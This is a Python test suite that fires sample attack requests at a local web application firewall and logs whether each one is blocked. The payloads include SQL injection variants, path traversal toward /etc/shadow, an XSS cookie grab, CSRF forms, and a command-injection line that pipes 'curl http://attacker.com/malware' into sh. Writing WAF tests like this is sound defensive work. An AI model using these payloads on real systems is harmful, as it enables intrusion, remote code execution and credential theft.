import requests
import json
import time

WAF_URL = "http://localhost:5000"

def test_request(name, method, path, data=None, headers=None, body_str=None):
    url = f"{WAF_URL}{path}"
    print(f"\n🚀 Testing category: {name}")
    
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            if body_str:
                response = requests.post(url, data=body_str, headers=headers, timeout=10)
            else:
                response = requests.post(url, json=data, headers=headers, timeout=10)
        
        status = response.status_code
        if status == 403:
            print(f"   🔴 RESULT: BLOCKED (403) - Detection Successful")
        elif status == 502:
            print(f"   🟢 RESULT: ALLOWED (502) - WAF passed, but target server is down")
        elif status == 200:
            print(f"   🟢 RESULT: ALLOWED (200) - WAF passed")
        else:
            print(f"   ⚪ RESULT: Status {status}")
            
    except Exception as e:
        print(f"   ❌ ERROR: {e}")

if __name__ == "__main__":
    print("🛡️ TEST SUITE 🛡️")
    print("=========================================")

    # 1. Category: FUZZERS
    test_request(
        "Fuzzers", 
        "POST", "/api/v1/user", 
        body_str="A" * 512 + "\x01\x02\x03\xff\xfe" + "%s%p%n" * 10
    )

    # 2. Category: ANALYSIS
    test_request(
        "Analysis", 
        "GET", "/etc/passwd?file=../../../../etc/shadow&sh=cat"
    )

    # 3. Category: DOS (Denial of Service)
    test_request(
        "DoS", 
        "POST", "/upload", 
        body_str="X" * 15000
    )

    # 4. Category: EXPLOITS
    test_request(
        "Exploits", 
        "POST", "/login", 
        data={"username": "admin' OR 1=1 --", "password": "<script>alert(document.cookie)</script>"}
    )

    # 5. Category: RECONNAISSANCE
    test_request(
        "Reconnaissance", 
        "GET", "/.git/config", 
        headers={"User-Agent": "Nikto/2.1.6 (Security Scanner)"}
    )

    # 6. Category: GENERIC / SHELLCODE
    test_request(
        "Generic/Shellcode", 
        "POST", "/execute", 
        body_str="; id; uname -a; curl http://attacker.com/malware | sh"
    )

    # 7. Category: NORMAL
    test_request(
        "Normal (Benign)", 
        "GET", "/index.html", 
        headers={"User-Agent": "Mozilla/5.0"}
    )
    
    # 8. SQL Injection (Generic Pattern)
    test_request(
        "SQL Script",
        "GET", "/search?q=UNION+SELECT+*+FROM+users",
        data={"query": "SELECT * FROM users"}
    )
    
    # 9. Category: SQL Injection (Specific Login Pattern)
    test_request(
        "SQL Injection Login", 
        "POST", "/login", 
        data={"username": "admin' OR '1'='1", "password": "password"}
    )

    # 10. Category: SQL Injection (Blind/Time-based)
    test_request(
        "SQL Injection (Time-based)",
        "GET", "/items?id=1'; WAITFOR DELAY '0:0:5'--"
    )

    # 11. Category: SQL Injection (Error-based)
    test_request(
        "SQL Injection (Error-based)",
        "GET", "/profile?user=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"
    )

    # 12. Category: SQL Injection (Obfuscated)
    test_request(
        "SQL Injection (Obfuscated)",
        "POST", "/api/data",
        data={"input": "UNI/**/ON SEL/**/ECT 1,2,3"}
    )

    # 13. Category: CSRF (Specific Pattern - POST)
    test_request(
        "CSRF Attack (POST)", 
        "POST", "/api/v1/update", 
        body_str='<body onload="document.forms[0].submit()">'
    )

    # 14. Category: CSRF (GET-based via Image)
    test_request(
        "CSRF Attack (GET)",
        "GET", "/api/v1/delete-account?confirm=true",
        headers={"Referer": "http://malicious-site.com"}
    )

    # 15. Category: CSRF (Hidden Iframe)
    test_request(
        "CSRF Attack (Iframe)",
        "POST", "/settings",
        body_str='<iframe name="csrf-frame" style="display:none"></iframe><form action="http://localhost:5000/settings" method="POST" target="csrf-frame">...</form>'
    )

    print("\n✅ Test sequence finished.")
